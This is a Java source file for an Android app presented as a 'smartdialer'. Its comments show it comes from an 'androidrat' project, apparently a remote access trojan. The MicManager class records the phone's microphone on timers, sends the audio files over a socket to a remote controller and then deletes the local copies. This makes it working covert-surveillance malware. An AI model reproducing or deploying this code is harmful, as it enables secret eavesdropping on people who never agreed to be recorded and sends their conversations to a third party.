package com.example.smartdialer;

import android.Manifest;
import android.content.pm.PackageManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.util.Log;

import androidx.annotation.RequiresApi;
import androidx.core.app.ActivityCompat;

import com.example.smartdialer.services.MainService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.util.Timer;
import java.util.TimerTask;

public class MicManager {
    static MediaRecorder recorder;
    static File audiofile = null;
    static final String TAG = "MediaRecording";
    static TimerTask startRecordingDelay;
    static TimerTask stopRecording;

    public static void saveAudio(int startDelay, int stopDelay, String path) throws Exception {
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("DIRR", dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }


        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        if (path.isEmpty() || path.length() < 2) {
            recorder.setOutputFile(audiofile.getAbsolutePath()); // /data/user/0/com.example.androidrat/cache/sound1848128329607129930.mp3
        } else {
            recorder.setOutputFile(path);
        }
        recorder.prepare();
        startRecordingDelay = new TimerTask() {
            @Override
            public void run() {
                recorder.start();

            }
        };

        new Timer().schedule(startRecordingDelay, startDelay * 1000);


        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.reset();
                recorder.release();
            }
        };

        new Timer().schedule(stopRecording, stopDelay * 1000);



    }

    public static void startRecord(String path) throws Exception {
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            Log.e("DIRR", dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }

        //Creating MediaRecorder and specifying audio source, output format, encoder & output format
        recorder = new MediaRecorder();
        recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
        recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
        recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
        if (path.isEmpty() || path.length() < 2) {
            recorder.setOutputFile(audiofile.getAbsolutePath()); // /data/user/0/com.example.androidrat/cache/sound1848128329607129930.mp3
            Log.d(TAG, "recording path: "+ audiofile.getAbsolutePath());
        } else {
            recorder.setOutputFile(path);
            Log.d(TAG, "recording path: "+ path);
        }
        recorder.prepare();
        recorder.start();
        Log.d(TAG, "startRecord: ");

    }
    public static void pauseRecord(){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            recorder.pause();
            Log.d(TAG, "pauseRecord: ");
        }
    }
    public static void resumeRecord(int sec){
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            recorder.resume();
            Log.d(TAG, "resumeRecord: ");
        }
        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.reset();
                recorder.release();
                Log.d(TAG, "recording finish: ");
            }
        };

        new Timer().schedule(stopRecording, sec * 1000);
    }


    public static void startRecording(int sec) {
        File dir = MainService.getContextOfApplication().getCacheDir();
        try {
            //Log.e("DIRR", dir.getAbsolutePath());
            audiofile = File.createTempFile("sound", ".mp3", dir);
            //Creating MediaRecorder and specifying audio source, output format, encoder & output format
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audiofile.getAbsolutePath());
            recorder.prepare();
            recorder.start();
        } catch (IOException e) {
            Log.e(TAG, "external storage access error");
            return;
        }

        stopRecording = new TimerTask() {
            @Override
            public void run() {
                //stopping recorder
                recorder.stop();
                recorder.reset();
                recorder.release();
                sendVoice(audiofile);
                audiofile.delete();
            }
        };

        new Timer().schedule(stopRecording, sec * 1000);
    }
    private static void sendVoice(File file) {

        int size = (int) file.length();
        byte[] data = new byte[size];
        try {
            BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
            buf.read(data, 0, data.length);
            JSONObject object = new JSONObject();
            object.put("file", true);
            object.put("name", file.getName());
            object.put("buffer", data);
            SocketConn.getInstance().getSocket().emit("record", object);
            buf.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        } catch (JSONException e) {
            e.printStackTrace();
        }

    }

    private void validateMicAvailability() {
        if (ActivityCompat.checkSelfPermission(MainService.getContextOfApplication(), Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            // TODO: Consider calling
            //    ActivityCompat#requestPermissions
            // here to request the missing permissions, and then overriding
            //   public void onRequestPermissionsResult(int requestCode, String[] permissions,
            //                                          int[] grantResults)
            // to handle the case where the user grants the permission. See the documentation
            // for ActivityCompat#requestPermissions for more details.
            return;
        }
        AudioRecord recorder = new AudioRecord(MediaRecorder.AudioSource.MIC,
                44100,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_DEFAULT, 44100);
        try {
            if (recorder.getRecordingState() != AudioRecord.RECORDSTATE_STOPPED) {
                //throw new Exception("Mic didn't successfully initialized");
            }

            recorder.startRecording();
            if (recorder.getRecordingState() != AudioRecord.RECORDSTATE_RECORDING) {
                recorder.stop();
                // throw new MicUnaccessibleException("Mic is in use and can't be accessed");
            }
            recorder.stop();
        } finally {
            recorder.release();
            recorder = null;
        }
    }

}

